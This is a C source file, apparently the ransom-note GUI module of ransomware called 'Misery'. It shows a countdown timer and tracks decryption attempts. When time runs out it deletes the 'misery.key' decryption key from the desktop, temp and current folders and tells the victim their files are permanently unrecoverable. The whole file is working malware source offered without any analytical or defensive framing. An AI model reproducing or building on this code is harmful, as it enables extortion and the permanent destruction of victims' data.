#include "gui_utils.h"
#include "../crypto.h"          /* CleanupCrypto */
#include "../misery_config.h"   /* MiseryLog */


/* State variables                                                     */

ULONGLONG g_timerEndFileTime = 0;
int       g_decryptAttempts  = 0;

/* UpdateTimerDisplay  */
void UpdateTimerDisplay(HWND hWnd) {
    FILETIME ftNow;
    GetSystemTimeAsFileTime(&ftNow);
    ULONGLONG now = ((ULONGLONG)ftNow.dwHighDateTime << 32) | ftNow.dwLowDateTime;

    if (now >= g_timerEndFileTime) {
        SetDlgItemTextA(hWnd, IDC_TIMER, "00:00:00");
        return;
    }

    ULONGLONG diff100ns = g_timerEndFileTime - now;
    ULONGLONG totalSeconds = diff100ns / 10000000ULL;

    DWORD hours   = (DWORD)(totalSeconds / 3600);
    DWORD minutes = (DWORD)((totalSeconds % 3600) / 60);
    DWORD seconds = (DWORD)(totalSeconds % 60);

    char timeBuf[32];
    snprintf(timeBuf, sizeof(timeBuf), "%02lu:%02lu:%02lu", hours, minutes, seconds);
    SetDlgItemTextA(hWnd, IDC_TIMER, timeBuf);
}

/* UpdateAttemptsDisplayd */
void UpdateAttemptsDisplay(HWND hWnd) {
    char buf[64];
    snprintf(buf, sizeof(buf), "Attempts: %d / %d",
             g_decryptAttempts, MAX_DECRYPT_ATTEMPTS);
    SetDlgItemTextA(hWnd, IDC_ATTEMPTS, buf);
    MiseryLog(MISERY_LOG_INFO, "RansomNote: Attempts updated: %d/%d",
              g_decryptAttempts, MAX_DECRYPT_ATTEMPTS);
}

/* DestroyKeyAndClose — unchanged */
void DestroyKeyAndClose(HWND hWnd) {
    MiseryLog(MISERY_LOG_WARN, "RansomNote: Key destruction triggered!");

    DeleteFileA("misery.key");

    char desktop[MAX_PATH] = {0};
    if (SHGetFolderPathA(NULL, CSIDL_DESKTOP, NULL, 0, desktop) == S_OK) {
        char keyPath[MAX_PATH * 2];
        snprintf(keyPath, sizeof(keyPath), "%s\\misery.key", desktop);
        DeleteFileA(keyPath);
    }

    char tempPath[MAX_PATH] = {0};
    if (GetTempPathA(MAX_PATH, tempPath)) {
        char keyPath3[MAX_PATH * 2];
        snprintf(keyPath3, sizeof(keyPath3), "%s\\misery.key", tempPath);
        DeleteFileA(keyPath3);
    }

    char curDir[MAX_PATH] = {0};
    GetCurrentDirectoryA(MAX_PATH, curDir);
    if (_stricmp(curDir, desktop) != 0 && _stricmp(curDir, tempPath) != 0) {
        char keyPath2[MAX_PATH * 2];
        snprintf(keyPath2, sizeof(keyPath2), "%s\\misery.key", curDir);
        DeleteFileA(keyPath2);
    }

    CleanupCrypto();

    MessageBoxA(hWnd,
        "TIME EXPIRED  The decryption key has been destroyed.\n"
        "YOUR FILES ARE PERMANENTLY UNRECOVERABLE.",
        "FILES LOST FOREVER", MB_OK | MB_ICONERROR);

    KillTimer(hWnd, 1);
    DestroyWindow(hWnd);
}
